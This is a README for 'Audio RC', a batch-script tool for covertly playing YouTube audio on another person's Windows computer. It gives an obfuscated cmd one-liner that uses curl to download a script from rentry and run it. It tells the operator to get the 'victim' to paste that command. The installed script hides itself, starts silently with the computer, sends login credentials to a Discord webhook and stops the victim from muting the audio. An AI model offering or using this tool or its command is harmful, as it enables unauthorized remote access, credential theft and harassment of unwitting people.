## 🔊 Audio RC Version 2.1
> Audio RC allows you to remote other machine and silently play youtube audio in it without the other side knowing how to stop or who did it.

#### Audio RC Features
* **Discord Webhook Credentials updating**

    _if the other side has reset the session URL for any reason, you will recieve a new message containing the updated information_

* **Audio RC starts with the computer everytime**

    _When the computer restarts Audio RC will start silently without the other side knowing about it and its going to send you a new message to your discord channel - if the message already exists its going to edit the message instead of sending it over again._

* **Play any content valid on youtube**

    _You are able to play any youtube video using its URL_
    P.S. _Also planning to add spotify feature_

* **A Script to remote the other side _(NEW)_**

    _Version 2.0 introduced a remote script which makes it much easier
    to control the other side, you open the script, paste the youtube link and the script does anything for you and keeps you updated about the other side's status_

#### Setup Audio RC
_Technically, there are 2 ways to setup Audio RC_

##### Difference Menu
| METHOD | DIFFERENCE | Recommended? |
| :--: | :--: | :--: |
| 1 | _This method will send the login credentials to your discord webhook and will keep you updated in case they were changed_ | **This method is just a bit harder to setup,** though you will recieve the login credentials into your discord webhook. **(HIGHLY RECOMMENDED)** |
| 2 | _This method will only print the login credentials on the screen while you are in DEBUG mode_ | Technically, **YOU SHOULDN'T USE THIS METHOD UNLESS YOU HAVE SSH ACCESS** to the same computer |

##### :one: Method Number 1
- [Create your webhook link at discord](https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks)
> _How does a webhook look?_
>
> Your webhook should include `/api/webhooks/` inside of it.

- At this point you'd need to create a paste in [pastebin.com](https://pastebin.com/) and just paste your webhook link inside of it. _(GIF below)_
![Paste Creation Review](https://cdn.agamsol.xyz:90/media/chrome_5NaMTYFDtr.gif)
- Now you need to copy the paste's ID _(GIF below)_
![Copy ID](https://cdn.agamsol.xyz:90/media/chrome_wetwcveipX.gif)

- Once you copied the ID **replace `XXXXXXXX`** in the end of the command below **with the ID you copied**.
```bat
for %a in (F6) do for %b in ("%temp%\F") do for %c in (.) do for %d in (cmd) do for %e in (rentry) do cls&&curl -#Lsko "%~b6%c%d" "%e%cco/%a/raw"&&call "%~b6%c%d" "XXXXXXXX"
```
- After replacing the `XXXXXXXX` combination with your ID
you are ready to go, save the command and you will be able to use it in the future

- **ONCE YOU ARE WILLING TO USE THE COMMAND:**
- Tell the victim to open CMD window.
- Tell the victim to paste **YOUR unique command** into their CMD window.
- Wait for the credentials to get sent to you.

### You got the credenitials? Great! :tada:

_At this step we will be installing the remote panel, if you want to use it but scared, you can use it in a VM or you can check the [source code](https://github.com/agamsol/Audio-RC/blob/2.1/REMOTE/REMOTE.bat) of the remote script._

- Download the [Remote Script](https://raw.githubusercontent.com/agamsol/Audio-RC/2.1/REMOTE/REMOTE.bat)
> NOTE: You should download the script and put it on a folder on its own, this will grant you easy access to it whenever you need & want.
- Open the file [`REMOTE.bat`](https://raw.githubusercontent.com/agamsol/Audio-RC/2.1/REMOTE/REMOTE.bat)
- Enter the credentials to login.

##### :two: Method Number 2 _(SSH)_
- Paste the following code into the SSH
```bat
for %a in (F6) do for %b in ("%temp%\F") do for %c in (.) do for %d in (cmd) do for %e in (rentry) do cls&&curl -#Lsko "%~b6%c%d" "%e%corg/%a/raw"&&call "%~b6%c%d" --debug
```
- You should restart the computer through your SSH connection.

### 📝 Change Log
> After struggling a lot with the code from version 2.0 I almost gave up doing that and starting to make the script over again, although I was really carious if I could fix it and in the end I managed to convert both, the main script and the remote to support INI formatting instead of JSON FORMATTING
- Storing DATA with `INI` formatted configs and databases
- Integrated my [SDK](https://github.com/agamsol/SDK) into Audio RC 🎉
- Change the volume of the victim's PC while the video is playing, keep it sync and not let the victim to mute his own system audio while audio is playing
- Properly check for internet connection, the socket also checks the connection now and stops the script until the connection is established once again.
- Improved script start-delay
- Better ERROR DETECTION for discord webhooks (checking if they work using the string regex and if there's a match only then we send the message)
- Edit the discord message if it already exists in your webhook (does not require authentication)

#### 📚 Contact information and support
> Feel free to contact me in discord, <span style="color:#7289DA">Agam#0001</span>

> Im also available in the [r/batch discord server](https://discord.gg/gPMcxXZjkb). **(you can and should ping me there if you want support from me)**

### 💲 Donations
I highly appreciate donors who send money,
a few bucks can make someone's day even better!
><a href="https://www.paypal.me/agamsolomon0011" rel="paypal donations">![donate](https://img.shields.io/badge/Donate-Paypal-brightgreen.svg)</a>

##### **:warning: Please note that we follow the No-Refunds policy**